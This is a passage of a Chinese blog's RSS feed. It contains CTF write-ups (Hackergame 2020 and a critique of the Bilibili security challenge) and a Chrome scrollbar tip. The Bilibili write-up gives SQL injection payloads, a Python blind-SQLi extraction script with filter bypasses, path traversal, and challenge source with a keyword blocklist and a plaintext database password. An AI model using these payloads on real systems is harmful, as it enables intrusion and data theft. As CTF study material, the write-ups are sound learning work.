+<figure class="wp-block-image size-large is-resized"><a href="https://dev.moe/wp-content/uploads/2020/11/dTkSFYZLNSgTr-1.1.png"><img loading="lazy" src="https://dev.moe/wp-content/uploads/2020/11/dTkSFYZLNSgTr-1.1.png" alt="" class="wp-image-2101" width="390" height="335" srcset="https://dev.moe/wp-content/uploads/2020/11/dTkSFYZLNSgTr-1.1.png 745w, https://dev.moe/wp-content/uploads/2020/11/dTkSFYZLNSgTr-1.1-300x258.png 300w" sizes="(max-width: 390px) 100vw, 390px" /></a></figure>
+
+
+
+<p>很好，要多少个 flag，就给多少个 flag！页面中有一个范围为 0~1.5 的滑动条。不过这滑动条的精度设置的非常高，使用鼠标来来回回左右拖曳就是设定不出一个整数。</p>
+
+
+
+<h3>Range Slider</h3>
+
+
+
+<p>这个带范围的拖动条在 HTML 中称作 <strong><strong>Range Slider</strong></strong>，是一个标准的 Input 控件。下文中我们将这样的 Range Slider 控件简称为 <strong>RSC</strong>（<strong>R</strong>ange <strong>S</strong>licer <strong>C</strong>omponent）。</p>
+
+
+
+<p>当浏览器呈现诸如 RSC 这样的控件时，为了确保各终端用户都可以正常使用，实现<strong>网页无障碍化</strong>（Web Accessibility），会兼容多种操作模式，例如键盘、鼠标、触摸操作等。</p>
+
+
+
+<p>在本题中，显然鼠标、触摸操作无法精准定位 RSC，但键盘就可以实现精准定位。通过参考 W3C 工作组发布的关于无障碍化相关标准的文档，可以了解使用键盘操作 RSC 的规则。</p>
+
+
+
+<figure class="wp-block-image size-large is-resized"><a href="https://dev.moe/wp-content/uploads/2020/11/dTkSFYZLNSgTr-1.2.png"><img loading="lazy" src="https://dev.moe/wp-content/uploads/2020/11/dTkSFYZLNSgTr-1.2.png" alt="" class="wp-image-2103" width="471" height="161" srcset="https://dev.moe/wp-content/uploads/2020/11/dTkSFYZLNSgTr-1.2.png 891w, https://dev.moe/wp-content/uploads/2020/11/dTkSFYZLNSgTr-1.2-300x103.png 300w, https://dev.moe/wp-content/uploads/2020/11/dTkSFYZLNSgTr-1.2-768x264.png 768w" sizes="(max-width: 471px) 100vw, 471px" /></a><figcaption>https://www.w3.org/TR/wai-aria-practices-1.1/#slider</figcaption></figure>
+
+
+
+<p>这里的 <code>Left Arrow</code> 对应了键盘上的 <code>←</code> 键、<code>Right Arrow</code> 对应了键盘上的 <code>→</code> 键。也就是说，使用键盘上的 <code>←</code>、<code>→</code> 键就能实现与 RSC 的精准交互。</p>
+
+
+
+<h3>键盘操作</h3>
+
+
+
+<p>先使用鼠标将 flag 的数量设置到接近 1.00000 的位置，通过使用键盘操作。很快 flag 的数量就迅速逼近 1.00000，距离最终的成功也越来越近了。</p>
+
+
+
+<figure class="wp-block-image size-large is-resized"><a href="https://dev.moe/wp-content/uploads/2020/11/dTkSFYZLNSgTr-1.2.gif"><img loading="lazy" src="https://dev.moe/wp-content/uploads/2020/11/dTkSFYZLNSgTr-1.2.gif" alt="" class="wp-image-2102" width="420" height="277"/></a><figcaption>cchchachanchang长</figcaption></figure>
+
+
+
+<p>但此时却发生了一件不合常理的事情，在 flag 数量为 1.00001 处按下 <code>←</code> 键时，数量直接变为了 0.99999，反之亦然。无论怎么尝试，flag 数量都无法设定为 1.00000。</p>
+
+
+
+<p>显然，这不仅仅是一个简单的 Range Slider 组件。这很可能是一个受到 JavaScript 控制的 Range Slider 组件（JavaScript Controlled Range Slider Component）。</p>
+
+
+
+<h3>JavaScript 分析</h3>
+
+
+
+<p>使用右键查看网页的源代码，很快就证实了先前的猜测。签到题出题人通过编写 JavaScript，暗中修改了 RSC 的运作规则。</p>
+
+
+
+<pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">&lt;input type="range" id="number" name="number" class="form-control" value="0" min="0" max="1.5" step="0.00001"/>
+...
+$('#number').on('input', function() {
+	if ($('#number')[0].value.toString() === "1") {
+		console.log('没想到吧!');
+		$('#number')[0].value = 1.00001;
+		if (prevVal == 1.00001)  $('#number')[0].value = 0.99999;
+		if (prevVal == 0.99999)  $('#number')[0].value = 1.00001;
+	}
+}</pre>
+
+
+
+<p>可以看到，出题人设定的规则是：当 RSC 收到用户输入时，如果其数值对应的字符串为 <code>"1"</code>，则根据规则将 RSC 的值为 0.99999 或 1.00001。</p>
+
+
+
+<p>我们知道，这个滚动条的范围是 0~1.5，其中有两个整数：0、1。而能提取出 flag 的整数只有 1，而出题者又通过 JavaScript 控制 RSC，使其无法设定为 1。也就是说，签到题出题者限制了我们能够提交的唯一的整数。</p>
+
+
+
+<h3>问题的本质</h3>
+
+
+
+<p>但事情并没有那么单纯。这真的是出题者限制的吗？如果只是从表面上看，确实是这样。但如果透过表象看本质，可以发现其实并非如此——<span style="text-decoration: underline;">拦在选手面前的并非出题人，而是拒绝选手将 RSC 设定为 1.00000 的浏览器</span>。也就是说，并非出题人直接限制了能够提交的整数，而是出题人<span style="text-decoration: underline;">利用了选手的浏览器</span>，限制了选手能够提交的整数。</p>
+
+
+
+<p>思考到这一步，问题就迎刃而解了。显然，我们编写一个简易的、只能访问这一个页面的、不会限制 RSC 数值的命令行浏览器即可求解本题。</p>
+
+
+
+<pre class="EnlighterJSRAW" data-enlighter-language="js" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">const net = require('net');
+var clientSocket = net.connect(10000, '202.38.93.111');
+clientSocket.on('connect', function() {
+  clientSocket.write(
+    'GET http://202.38.93.111:10000/?number=1 HTTP/1.0\r\n' +
+    'Host: 202.38.93.111:10000\r\n' + 
+    'Cookie: 【选手Cookies】\r\n\r\n');
+})
+
+clientSocket.on('data', (data) => {
+  console.log(data.toString().trim());
+});</pre>
+
+
+
+<p>运行这段自制浏览器代码后，即可突破浏览器的限制，成功提交数值 <code>1</code>，并获得 flag。</p>
+
+
+
+<hr class="wp-block-separator"/>
+
+
+
+<p>这次好几题似乎都非预期了（超迷你的挖矿模拟器、中间人后两问），所以分数水分还是比较大的（不过其他选手也有非预期，所以应该没什么问题吧！(。&gt;︿&lt;)）。</p>
+
+
+
+<p>最后没解出的几题都是二进制相关的，看了题解，感觉自己也确实是做不出（嗯，并不是 IDA 版本太旧）。感觉是时候要去了解下 pwnable 了。（咕咕咕）</p>
+
+
+
+<p><strong>Coxxs</strong></p>
+<p><a rel="nofollow" href="https://dev.moe/2099">Hackergame 2020（中科大信安赛）write up</a>最先出现在<a rel="nofollow" href="https://dev.moe">Coxxs</a>。</p>
+]]></content:encoded>
+					
+					<wfw:commentRss>https://dev.moe/2099/feed</wfw:commentRss>
+			<slash:comments>3</slash:comments>
+		
+		
+		<post-id xmlns="com-wordpress:feed-additions:1">2099</post-id>	</item>
+		<item>
+		<title>首届 Bilibili 安全挑战赛吐槽</title>
+		<link>https://dev.moe/1907</link>
+					<comments>https://dev.moe/1907#comments</comments>
+		
+		<dc:creator><![CDATA[Coxxs]]></dc:creator>
+		<pubDate>Mon, 26 Oct 2020 16:00:00 +0000</pubDate>
+				<category><![CDATA[Code]]></category>
+		<guid isPermaLink="false">https://dev.moe/?p=1907</guid>
+
+					<description><![CDATA[<p>朋友发来一个 Bilibili CTF 的链接，点进去看了下。开赛已经几小时，进入比赛的按钮指向的是一个 10<a class="more-link" href="https://dev.moe/1907">继续阅读<span class="screen-reader-text">"首届 Bilibili 安全挑战赛吐槽"</span></a></p>
+<p><a rel="nofollow" href="https://dev.moe/1907">首届 Bilibili 安全挑战赛吐槽</a>最先出现在<a rel="nofollow" href="https://dev.moe">Coxxs</a>。</p>
+]]></description>
+										<content:encoded><![CDATA[
+<p>朋友发来一个 Bilibili CTF 的链接，点进去看了下。开赛已经几小时，进入比赛的按钮指向的是一个 <code>10.</code> 开头的<strong>内网IP地址</strong>。试着把这个IP换成当前页面的地址，成功进入了题目页面。又过了一阵子，这个进入比赛的链接终于被改成正确的地址了——我想，这应该只是个小失误吧。作为国内最大（去二次元化）二次元视频网站的哔哩哔哩，其举办的安全竞赛不说专业，但应该也会挺有意思的吧。</p>
+
+
+
+<figure class="wp-block-image size-large is-resized"><a href="https://dev.moe/wp-content/uploads/2020/10/2.png"><img loading="lazy" src="https://dev.moe/wp-content/uploads/2020/10/2-1024x516.png" alt="" class="wp-image-1913" width="627" height="316" srcset="https://dev.moe/wp-content/uploads/2020/10/2-1024x516.png 1024w, https://dev.moe/wp-content/uploads/2020/10/2-300x151.png 300w, https://dev.moe/wp-content/uploads/2020/10/2-768x387.png 768w, https://dev.moe/wp-content/uploads/2020/10/2.png 1060w" sizes="(max-width: 627px) 100vw, 627px" /></a><figcaption>前去（B站内网）解题</figcaption></figure>
+
+
+
+<p>确实挺有意思的，不过有意思的并不是题目本身。</p>
+
+
+
+<span id="more-1907"></span>
+
+
+
+<h2><s>Write up</s> 吐槽时间</h2>
+
+
+
+<p>题 1-6 必须解出前一题才能看见下一题题目。</p>
+
+
+
+<p><strong>题 1：</strong> <code>&lt;input type="hidden" values="{flag}"&gt;</code></p>
+
+
+
+<p><strong>题 2：</strong>“需要使用bilibili Security Browser浏览器访问～” → 修改 User-Agent。</p>
+
+
+
+<p><strong>题 3：</strong>“密码是啥？” → <span style="text-decoration: underline;">盲猜</span>出用户名/密码 admin/bilibili。<br><em><span style="color:#6E6E6E" class="has-inline-color">B：没错这不是注入，你们字典里没有 bilibili 是你们的问题！</span></em></p>
+
+
+
+<figure class="wp-block-image size-large"><a href="https://dev.moe/wp-content/uploads/2020/10/image.png"><img loading="lazy" width="1024" height="846" src="https://dev.moe/wp-content/uploads/2020/10/image-1024x846.png" alt="" class="wp-image-1914" srcset="https://dev.moe/wp-content/uploads/2020/10/image-1024x846.png 1024w, https://dev.moe/wp-content/uploads/2020/10/image-300x248.png 300w, https://dev.moe/wp-content/uploads/2020/10/image-768x634.png 768w, https://dev.moe/wp-content/uploads/2020/10/image.png 1354w" sizes="(max-width: 1024px) 100vw, 1024px" /></a><figcaption>我是弱密码哟~ ✧</figcaption></figure>
+
+
+
+<p><strong>题 4：</strong>“superadmin.html: 对不起，权限不足～” → Cookies 中有 role=md5(&#8216;user&#8217;)（首字母小写），<span style="text-decoration: underline;">盲猜</span>出 role=md5(&#8216;Administrator&#8217;) 提交。<br><span style="color:#6E6E6E" class="has-inline-color"><em>B：root 是什么？superadmin 是什么？超级管理员是 Administrator（首字母<strong>大写</strong>）</em>哟~ ✧</span></p>
+
+
+
+<p><strong>题 5：</strong>“有些秘密只有超级管理员才能看见哦”，同时源码中 uid=100336889 → 从 100336889 递增爆破出超级管理员 uid。<br><span style="color:#6E6E6E" class="has-inline-color"><em>B：9bishi 已经不是超级管理员了，我家超级管理员是一个 uid 非常大的员工，别问为什么</em>~</span></p>
+
+
+
+<hr class="wp-block-separator"/>
+
+
+
+<p>接下来只有题 6 给出了一个 URL，7-10 均未给出题目。</p>
+
+
+
+<p><strong>题 6：</strong>一个文章标题内容均为 &#8220;null&#8221;，带评论框的博客页面（single.php?id=1）<br>→ 在 <strong>Referer</strong> 中进行盲注。<br><span style="color:#6E6E6E" class="has-inline-color"><em>B：是的，评论框是装饰用的，<code>?id=1</code> 也是装饰用的~</em></span><br><span style="color:#6E6E6E" class="has-inline-color"><em>我们的鉴权是用 <strong>Referer </strong>做的，Referer 正确就能看到文章内容，是不是很符合实际？</em></span><br><em><span style="color:#6E6E6E" class="has-inline-color">对了，为了防止你们乱搞我把 MySQL 的 sleep 函数顺手禁了！</span></em><br><span style="color:#6E6E6E" class="has-inline-color"><em><strong>benchmark </strong>函数是啥？没听说过！等下&#8230; 靶机怎么又 502 了？</em></span></p>
+
+
+
+<p><strong>题7：</strong>在前几题发现一个 /api/images?file=banner.png，没错，接着猜路径。</p>
+
+
+
+<figure class="wp-block-image size-large is-resized"><a href="https://dev.moe/wp-content/uploads/2020/10/image-5.png"><img loading="lazy" src="https://dev.moe/wp-content/uploads/2020/10/image-5.png" alt="" class="wp-image-2074" width="522" height="104" srcset="https://dev.moe/wp-content/uploads/2020/10/image-5.png 935w, https://dev.moe/wp-content/uploads/2020/10/image-5-300x60.png 300w, https://dev.moe/wp-content/uploads/2020/10/image-5-768x154.png 768w" sizes="(max-width: 522px) 100vw, 522px" /></a></figure>
+
+
+
+<p><strong>题 8：</strong>扫描题 6 给出的 IP，发现 redis 端口，连入 <code>get flag8</code>。</p>
+
+
+
+<p><strong>题 9：</strong>题目位于 /api/images?file=../../../secret.txt，48 字节的未知数据，赛中无人解出本题。<br>赛后有人给出密钥为 &#8216;aes_key&#8217; + &#8216;\0&#8217; * 9，使用 AES-128-ECB 加密，该密钥据说可通过 api/images?file=md5(&#8216;SkRG&#8230;Rw==&#8217;).jpg 获得。</p>
+
+
+
+<figure class="wp-block-image size-large is-resized"><a href="https://dev.moe/wp-content/uploads/2020/10/image-6.png"><img loading="lazy" src="https://dev.moe/wp-content/uploads/2020/10/image-6-1024x153.png" alt="" class="wp-image-2075" width="628" height="93" srcset="https://dev.moe/wp-content/uploads/2020/10/image-6-1024x153.png 1024w, https://dev.moe/wp-content/uploads/2020/10/image-6-300x45.png 300w, https://dev.moe/wp-content/uploads/2020/10/image-6-768x115.png 768w, https://dev.moe/wp-content/uploads/2020/10/image-6-1536x229.png 1536w, https://dev.moe/wp-content/uploads/2020/10/image-6.png 1554w" sizes="(max-width: 628px) 100vw, 628px" /></a></figure>
+
+
+
+<pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">data = 'SkRGWDZRZnJxelJQU21YME42MU04OWlwV1l0SlYvcEJRVEJPWWFYUXVHOGZBcnJ1bjNXS3hXRlpHd05uMjFjRw=='
+aes_128_ecb_decrypt(base64_decode(base64_decode(data)), 'aes_key\0\0\0\0\0\0\0\0\0') // flag9-8b522546-e52d83b8-5682e05c-c8cb237c</pre>
+
+
+
+<p><strong>题 10：</strong><br>1. 扫描题 6 给出的 URL，发现一个包含 jsfuck 代码的页面 <code>test.php</code>。<br>2. 解码获得关键词，并提示访问 github 搜索。<br>3. 在 github 找到<a href="https://github.com/interesting-1024/end/" target="_blank" rel="noreferrer noopener">源码</a>后用 ?id[]=1 绕过 PHP 判断<br>4. <span style="text-decoration: underline;">猜出</span> flag 位于 <code><strong>[这里填入一个任意字符]</strong>flag.txt</code>（实质是 <code>strpos($url, 'flag.txt') != false</code> 就给过）<br><em><span style="color:#6E6E6E" class="has-inline-color">B：你说 strpos 返回值需要用 <strong>!== </strong>运算符来判断？不，我就是要用 <strong>!=</strong> ~</span></em></p>
+
+
+
+<figure class="wp-block-image size-large is-resized"><a href="https://dev.moe/wp-content/uploads/2020/10/image-3.png"><img loading="lazy" src="https://dev.moe/wp-content/uploads/2020/10/image-3-1024x591.png" alt="" class="wp-image-2030" width="577" height="333" srcset="https://dev.moe/wp-content/uploads/2020/10/image-3-1024x591.png 1024w, https://dev.moe/wp-content/uploads/2020/10/image-3-300x173.png 300w, https://dev.moe/wp-content/uploads/2020/10/image-3-768x443.png 768w, https://dev.moe/wp-content/uploads/2020/10/image-3.png 1339w" sizes="(max-width: 577px) 100vw, 577px" /></a></figure>
+
+
+
+<figure class="wp-block-image size-large is-resized"><a href="https://dev.moe/wp-content/uploads/2020/10/image-4.png"><img loading="lazy" src="https://dev.moe/wp-content/uploads/2020/10/image-4.png" alt="" class="wp-image-2031" width="575" height="137" srcset="https://dev.moe/wp-content/uploads/2020/10/image-4.png 1019w, https://dev.moe/wp-content/uploads/2020/10/image-4-300x72.png 300w, https://dev.moe/wp-content/uploads/2020/10/image-4-768x183.png 768w" sizes="(max-width: 575px) 100vw, 575px" /></a></figure>
+
+
+
+<p>好了，吐槽部分结束，作为比较菜的 ctf 玩家，第 6 题作为一道盲注还是有些东西可以写。第 7 题和第 9 题题目在比赛临近结束大佬提示后才找到题目位置，没想到依然是猜路径。</p>
+
+
+
+<h2>第 6 题：Boolean based Blind&nbsp;SQL Injection</h2>
+
+
+
+<figure class="wp-block-image size-large is-resized"><a href="https://dev.moe/wp-content/uploads/2020/10/image-2.png"><img loading="lazy" src="https://dev.moe/wp-content/uploads/2020/10/image-2-1024x467.png" alt="" class="wp-image-2027" width="765" height="348" srcset="https://dev.moe/wp-content/uploads/2020/10/image-2-1024x467.png 1024w, https://dev.moe/wp-content/uploads/2020/10/image-2-300x137.png 300w, https://dev.moe/wp-content/uploads/2020/10/image-2-1536x701.png 1536w, https://dev.moe/wp-content/uploads/2020/10/image-2-2048x935.png 2048w, https://dev.moe/wp-content/uploads/2020/10/image-2-1568x716.png 1568w" sizes="(max-width: 765px) 100vw, 765px" /></a></figure>
+
+
+
+<p>第 6 题是一个 SELECT 的 SQL 语句（一开始以为是 INSERT 之类的），注入点位于 HTTP_REFERER。如果有结果则显示文章，无结果显示空文章，本应是一个基于布尔值的盲注（Boolean based Blind&nbsp;SQL Injection）。</p>
+
+
+
+<pre class="EnlighterJSRAW" data-enlighter-language="php" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">$payload_sql = "SELECT * FROM bilictf.refer where refer='{filter($_SERVER['HTTP_REFERER'])}';";</pre>
+
+
+
+<p>filter 函数过滤了一些关键词，同时 MySQL 禁用了 Sleep 函数（后来又允许使用了），但 Benchmark 函数未禁用（这可能也是本题靶机频繁宕机的原因之一）。使用 sqlmap 及合适的 level / risk 参数（以及在没有人跑 sqlmap 的靶机不会宕机的深夜）可以跑出一个基于时间的盲注（Time based Blind&nbsp;SQL Injection）。</p>
+
+
+
+<p>如果用 Benchmark 函数做，Payload 如下：</p>
+
+
+
+<pre class="EnlighterJSRAW" data-enlighter-language="sql" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">SELECT ... WHERE refer='' + IF(ascii(SUBSTRING(database(),1,1))>32,BENCHMARK(5000000,MD5(1)),0)</pre>
+
+
+
+<p>解出题目后发现其实是基于布尔值的盲注（通过文章显示与否判断），预期解如下：</p>
+
+
+
+<pre class="EnlighterJSRAW" data-enlighter-language="sql" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">SELECT ... WHERE refer='' or IF(ascii(SUBSTRING(database(),1,1))>32,1,0)</pre>
+
+
+
+<p>脚本如下：</p>
+
+
+
+<pre class="EnlighterJSRAW" data-enlighter-language="python" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">import requests
+
+url = "http://.../blog/single.php?id=1"
+result = ""
+
+ascii_list = range(1, 128)
+strpos = len(result)
+
+while(True):
+    strpos += 1
+    arr = ascii_list
+    start = 0
+    end = len(arr)
+
+    while(start &lt; end):
+        # time.sleep(0.2)
+        mid = (start + end)//2
+
+        # sql = "(SELECT database())" # bilictf
+        sql = "(SELECT`flag`FROM`flag`)"
+
+        payload = "' or IF(ascii(SUBSTRING(%s,%s,1))>%s,1,0)-- a" % (sql, strpos, arr[mid])
+
+        # 绕过过滤
+        payload = payload.replace("SELECT", "SEL&amp;ECT")
+        payload = payload.replace("or", "o&amp;r")
+
+        data = {'name': 'name'}
+        headers = {'Referer': payload, 'User-Agent': 'Mozilla/5.0'}
+        response = requests.post(url, data=data, headers=headers)
+        response.encoding = 'utf-8'
+        
+        page_byte = response.headers['Content-Length']
+        if int(page_byte) > 1487:
+            if end - start == 1:
+                if end &lt; 127:
+                    now_word = chr(arr[end])
+                else:
+                    now_word = '?' # 中文
+                result += now_word
+                break
+            else:
+                start = mid
+        else:
+            end = mid
+            now_word = ""
+    if now_word == "":
+        break
+    print(result)
+print('result:', result)
+</pre>
+
+
+
+<figure class="wp-block-image size-large is-resized"><a href="https://dev.moe/wp-content/uploads/2020/10/image-1.png"><img loading="lazy" src="https://dev.moe/wp-content/uploads/2020/10/image-1.png" alt="" class="wp-image-1927" width="424" height="165" srcset="https://dev.moe/wp-content/uploads/2020/10/image-1.png 588w, https://dev.moe/wp-content/uploads/2020/10/image-1-300x117.png 300w" sizes="(max-width: 424px) 100vw, 424px" /></a><figcaption>运行结果</figcaption></figure>
+
+
+
+<h2>总结</h2>
+
+
+
+<figure class="wp-block-image size-large is-resized"><a href="https://dev.moe/wp-content/uploads/2020/10/1.png"><img loading="lazy" src="https://dev.moe/wp-content/uploads/2020/10/1.png" alt="" class="wp-image-1912" width="457" height="331" srcset="https://dev.moe/wp-content/uploads/2020/10/1.png 597w, https://dev.moe/wp-content/uploads/2020/10/1-300x217.png 300w" sizes="(max-width: 457px) 100vw, 457px" /></a><figcaption>看来B站钱都花在前端上了</figcaption></figure>
+
+
+
+<p>回顾整场比赛，除了坑还是坑。前端代码残留了很多无助于解题的代码及注释。解题基本靠猜的情况导致了赛中提示就在网上漫天飞（说实话，如果没有这些提示，很多题我也猜不出）。现在看来，开赛初的那个小插曲只是这比赛各种坑点的冰山一角&#8230;</p>
+
+
+
+<p>不过，围观各路神仙在最后一题 <a href="https://github.com/interesting-1024/end/issues" target="_blank" rel="noreferrer noopener">github repo 中的吐槽</a>倒是成为了这次比赛的乐趣。有把 ETag&nbsp;当成 flag（假装）认真提出思路的，有用神奇的手法分析比赛中各种图片、挖出各种“证据”的，有练习给总部写英语作文索要 flag 的，还有galgame汉化组发招人广告的。天知道出题者不关 issue 是失误还是有意为之。</p>
+
+
+
+<p>另外，<a href="https://hack.lug.ustc.edu.cn/" target="_blank" rel="noreferrer noopener">Hackergame 2020</a> 几天后也要开始了。同样是偏趣味性的竞赛，但题目质量就很不错（至少<a href="https://dev.moe/1321" target="_blank" rel="noreferrer noopener">前两年</a>是如此），也能学到很多新东西，在此推荐给大家。</p>
+
+
+
+<p>附录附上了一些题目的源码，留作参考。</p>
+
+
+
+<p><strong>Coxxs</strong></p>
+
+
+
+<hr class="wp-block-separator"/>
+
+
+
+<p><strong>P.S.</strong> single.php 中的逻辑部分：</p>
+
+
+
+<pre class="EnlighterJSRAW" data-enlighter-language="php" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">&lt;?php
+
+function filter($str)
+{
+  $str = str_replace( '/', "", $str);
+  $str = str_replace( '"', "", $str);
+  $str = str_replace( '%', "", $str);
+  $str = str_ireplace('and', "",$str);
+  $str = str_ireplace('or',"",$str);
+  $str = str_replace('&amp;&amp;'," ",$str);
+  $str = str_replace('||'," ",$str);
+  $str = str_replace( ';', "", $str);
+  $str = str_ireplace( 'eval', " ", $str);
+  $str = str_ireplace( 'open', " ", $str);
+  $str = str_ireplace( 'sysopen', " ", $str);
+  $str = str_ireplace( 'system', " ", $str);
+  $str = str_ireplace("select","",$str);
+  $str = str_ireplace("join","",$str);
+  $str = str_ireplace("union","",$str);
+  $str = str_ireplace("where","",$str);
+  $str = str_ireplace("insert","",$str);
+  $str = str_ireplace("delete"," ",$str);
+  $str = str_ireplace("update"," ",$str);
+  $str = str_ireplace("like","",$str);
+  $str = str_ireplace("drop"," ",$str);
+  $str = str_ireplace("DROP"," ",$str);
+    $str = str_replace("&amp;","",$str);
+  return $str;
+}
+
+ 
+$servername = "localhost";
+$username = "root";
+$password = "2f7780c88a1301d04050b16e686dcea2";
+ 
+$conn = mysqli_connect($servername, $username, $password);
+mysqli_select_db($conn,"bilictf");
+ 
+if (!$conn) {
+  die("Connection failed: " . mysqli_connect_error());
+}
+$aid =$_GET['id'];
+$refer = $_SERVER["HTTP_REFERER"];
+ 
+if (!isset($aid))
+{
+  return;
+}
+if (!isset($refer))
+{
+    $refer = "https://www.bilibili.com/";
+}
+
+$aid = filter($aid);
+$refer = filter($refer);
+
+$sql = "SELECT * FROM bilictf.article where article_id=1;";
+
+$payload_sql =  "SELECT * FROM bilictf.refer where refer='$refer';";
+//echo $payload_sql;
+$result_payload = mysqli_query($conn, $payload_sql);
+if (mysqli_num_rows($result_payload) > 0) {
+    //echo $sql;
+    $result = mysqli_query($conn, $sql);
+    if (mysqli_num_rows($result) > 0) {
+      while($row = mysqli_fetch_assoc($result)) {
+        $title = $row["title"];
+            $content = $row["content"];
+            $creator = $row["creator"];
+            $time = $row["time"];
+    }
+    } else {
+      echo "0";
+    }
+} else {
+    $title = "null";
+    $content = "null";
+    $creator = "null";
+    $time = "null";
+}
+?></pre>
+
+
+
+<p><strong>P.P.S.</strong> 第 10 题的 end.php 实际源码：</p>
+
+
+
+<pre class="EnlighterJSRAW" data-enlighter-language="php" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">&lt;?php
+
+$str = intval($_GET['id']);
+$reg = preg_match('/\d/is', $_GET['id']);
+
+if(!is_numeric($_GET['id']) and $reg !== 1 and $str === 1){
+  $content = file_get_contents($_GET['url']);
+  //echo $content;
+  $filename = "./imgs/bilibili_224a634752448def6c0ec064e49fe797_havefun".".jpg";
+  if (strpos($_GET['url'],"flag.txt") == false){
+    echo "还差一点点啦～";
+  }else{
+    //file_put_contents($filename,$content);
+    echo "&lt;img src=".$filename.">";
+  }
+}else{
+  echo "你想要的不在这儿～";
+}
+?></pre>
+<p><a rel="nofollow" href="https://dev.moe/1907">首届 Bilibili 安全挑战赛吐槽</a>最先出现在<a rel="nofollow" href="https://dev.moe">Coxxs</a>。</p>
+]]></content:encoded>
+					
+					<wfw:commentRss>https://dev.moe/1907/feed</wfw:commentRss>
+			<slash:comments>8</slash:comments>
+		
+		
+		<post-id xmlns="com-wordpress:feed-additions:1">1907</post-id>	</item>
+		<item>
+		<title>在 Chrome 78 启用 overlay-scrollbars</title>
+		<link>https://dev.moe/1413</link>
+					<comments>https://dev.moe/1413#comments</comments>
+		
+		<dc:creator><![CDATA[Coxxs]]></dc:creator>
+		<pubDate>Thu, 24 Oct 2019 07:29:23 +0000</pubDate>
+				<category><![CDATA[Random]]></category>
+		<guid isPermaLink="false">https://coxxs.me/?p=1413</guid>
+
+					<description><![CDATA[<p>2021-6-24 Chrome 91 中已重新加回 overlay-scrollbars。chrome://<a class="more-link" href="https://dev.moe/1413">继续阅读<span class="screen-reader-text">"在 Chrome 78 启用 overlay-scrollbars"</span></a></p>
+<p><a rel="nofollow" href="https://dev.moe/1413">在 Chrome 78 启用 overlay-scrollbars</a>最先出现在<a rel="nofollow" href="https://dev.moe">Coxxs</a>。</p>
+]]></description>
+										<content:encoded><![CDATA[
+<p><strong>2021-6-24</strong> Chrome 91 中已重新加回 overlay-scrollbars。<code>chrome://flags/#overlay-scrollbars</code></p>
+
+
+
+<p>Chrome 的 Overlay Scrollbars（重叠式滚动条）我已用了好几年了。小小的透明灰条替代了原本占据一定宽度的粗滚动条，让视野干净不少，也消除了同一网站下网页切换时滚动条出现/消失时带来的页面抖动。</p>
+
+
+
+<figure class="wp-block-image is-resized"><img loading="lazy" src="https://dev.moe/wp-content/uploads/2019/11/image-3-1024x562.png" alt="" class="wp-image-1809" width="588" height="322" srcset="https://dev.moe/wp-content/uploads/2019/11/image-3-1024x562.png 1024w, https://dev.moe/wp-content/uploads/2019/11/image-3-300x165.png 300w, https://dev.moe/wp-content/uploads/2019/11/image-3-768x422.png 768w, https://dev.moe/wp-content/uploads/2019/11/image-3.png 1515w" sizes="(max-width: 588px) 100vw, 588px" /></figure>
+
+
+
+<p>然而在 Chrome 78 中，这个滚动条的开关在 <code>chrome://flags</code> 页面消失了。之前若是已启用 Overlay Scrollbars，仍可以继续使用该特性。但如果碰上浏览器重装或是新装，就找不到这个功能的开关了。</p>
+
+
+
+<span id="more-1413"></span>
+
+
+
+<p>好在这个功能的相关代码仍未被去除，该 flag <a rel="noreferrer noopener" aria-label="似乎只是“过期”了 (opens in a new tab)" href="https://groups.google.com/a/chromium.org/forum/#!topic/chromium-dev/9y_Xh8O-gXU" target="_blank">似乎只是“过期”了</a>。因此研究了下 <code>chrome://flags</code> 页面，找出了在 Chrome 78 下启用 Overlay Scrollbars 的方法：</p>
+
+
+
+<ol><li>打开 <code>chrome://flags</code> 页面</li><li>按 <code>F12</code> 打开开发者工具，并切换到 <code>Console</code> 页面</li><li>输入 <code>chrome.send('enableExperimentalFeature', ['overlay-scrollbars@1', 'true']);</code> 并按 <code>Enter</code></li><li>重启浏览器</li></ol>
+
+
+
+<p><s>该方法目前在最新的 Chrome Canary 80 下同样有效，但 Overlay Scrollbars 相关代码在未来是否会被删除，或是是否会继续开发，就不得而知了。</s></p>
+
+
+
+<p>该方法在 Chrome Beta 79 &amp; Chrome Canary 80 下均已失效，<a rel="noreferrer noopener" aria-label="查看讨论 (opens in a new tab)" href="https://www.reddit.com/r/chrome/comments/dq48n6/where_the_fuck_did_overlayscrollbars_go/" target="_blank">查看讨论</a>。 查看 Commit 历史后，发现该 flag 是在 <a rel="noreferrer noopener" aria-label="commit&nbsp;6311d9a (opens in a new tab)" href="https://github.com/chromium/chromium/commit/6311d9ad6cd4d879fc160b46d17c40de76e6492b" target="_blank">commit&nbsp;6311d9a</a> 中被禁用的。</p>
+
+
+
